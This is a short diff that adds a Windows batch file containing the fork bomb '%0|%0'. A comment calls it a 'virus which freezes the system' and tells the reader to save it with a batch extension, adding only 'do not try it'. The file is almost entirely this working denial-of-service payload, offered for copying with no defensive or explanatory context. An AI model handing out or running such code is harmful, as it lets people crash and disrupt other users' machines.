@@ -1,0 +1,5 @@
+//virus which freezes the system.
+
+%0|%0
+
+//copy the above code and save it with batch extension,but do not try it\
